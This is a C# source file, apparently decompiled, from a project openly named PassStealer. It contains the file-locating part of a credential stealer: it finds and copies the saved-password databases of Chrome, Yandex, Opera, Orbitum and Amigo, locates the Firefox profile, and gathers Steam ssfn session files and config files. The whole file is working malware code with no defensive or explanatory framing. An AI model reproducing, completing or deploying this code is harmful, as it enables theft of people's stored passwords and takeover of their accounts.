using Microsoft.Win32;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;

namespace PassStealer
{
	public class Path
	{
		public static List<string> GetChromePath(string type)
		{
			List<string> result;
			try
			{
				List<string> list = new List<string>();
				bool flag = false;
				string text = string.Empty;
				IDictionary environmentVariables = Environment.GetEnvironmentVariables();
				foreach (string a in environmentVariables.Keys)
				{
					if (a == "LOCALAPPDATA")
					{
						flag = true;
					}
				}
				if (type != null)
				{
					if (!(type == "Chrome"))
					{
						if (!(type == "Orbitum"))
						{
							if (!(type == "Amigo"))
							{
								if (type == "Yandex")
								{
									text = "\\Yandex\\YandexBrowser\\User Data\\";
								}
							}
							else
							{
								text = "\\Amigo\\User Data";
							}
						}
						else
						{
							text = "\\Orbitum\\User Data\\";
						}
					}
					else
					{
						text = "\\Google\\Chrome\\User Data\\";
					}
				}
				string path = flag ? (Environment.GetEnvironmentVariable("LOCALAPPDATA") + text) : (Environment.GetEnvironmentVariable("USERPROFILE") + "\\Local Settings\\Application Data" + text);
				DirectoryInfo directoryInfo = new DirectoryInfo(path);
				FileInfo[] files = directoryInfo.GetFiles("Login Data", SearchOption.AllDirectories);
				FileInfo[] array = files;
				for (int i = 0; i < array.Length; i++)
				{
					FileInfo fileInfo = array[i];
					string directoryName = fileInfo.DirectoryName;
					File.Copy(directoryName + "\\Login Data", directoryName + "\\Login_Data", true);
					list.Add(directoryName + "\\Login_Data");
				}
				result = list;
			}
			catch
			{
				result = null;
			}
			return result;
		}

		public static List<string> GetOperaPath()
		{
			List<string> result;
			try
			{
				List<string> list = new List<string>();
				string str = Environment.GetEnvironmentVariable("APPDATA") + "\\Opera Software\\Opera Stable\\";
				File.Copy(str + "Login Data", str + "Login_Data", true);
				list.Add(str + "Login_Data");
				result = list;
			}
			catch
			{
				result = null;
			}
			return result;
		}

		public static string GetFireFoxPath()
		{
			string result;
			try
			{
				string text = Environment.GetEnvironmentVariable("APPDATA") + "\\Mozilla\\Firefox\\";
				string text2 = File.ReadAllText(text + "profiles.ini");
				text2 = text2.Substring(text2.IndexOf("Path=") + 5);
				text2 = text2.Remove(text2.IndexOf("\r"));
				string[] array = text2.Split(new char[]
				{
					'/'
				});
				text2 = array[0] + "\\" + array[1];
				text += text2;
				result = text;
			}
			catch
			{
				result = null;
			}
			return result;
		}

		public static string GetFireFoxExePath()
		{
			string result;
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo((string)Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\firefox.exe", "Path", null));
				string text = directoryInfo.FullName;
				text += "\\";
				result = text;
			}
			catch
			{
				result = null;
			}
			return result;
		}

		public static List<string> getSteamPath(out string config_path)
		{
			List<string> result;
			try
			{
				List<string> list = new List<string>();
				DirectoryInfo directoryInfo = new DirectoryInfo((string)Registry.GetValue("HKEY_CURRENT_USER\\Software\\Valve\\Steam", "SteamPath", null));
				DirectoryInfo directoryInfo2 = new DirectoryInfo(directoryInfo.FullName + "/config");
				FileInfo[] files = directoryInfo.GetFiles("ssfn*", SearchOption.TopDirectoryOnly);
				FileInfo[] files2 = directoryInfo2.GetFiles("*.vdf", SearchOption.TopDirectoryOnly);
				FileInfo[] array = files;
				for (int i = 0; i < array.Length; i++)
				{
					FileInfo fileInfo = array[i];
					list.Add(fileInfo.FullName);
				}
				FileInfo[] array2 = files2;
				for (int j = 0; j < array2.Length; j++)
				{
					FileInfo fileInfo2 = array2[j];
					list.Add(fileInfo2.FullName);
				}
				config_path = directoryInfo2.ToString();
				result = list;
			}
			catch
			{
				config_path = null;
				result = null;
			}
			return result;
		}
	}
}
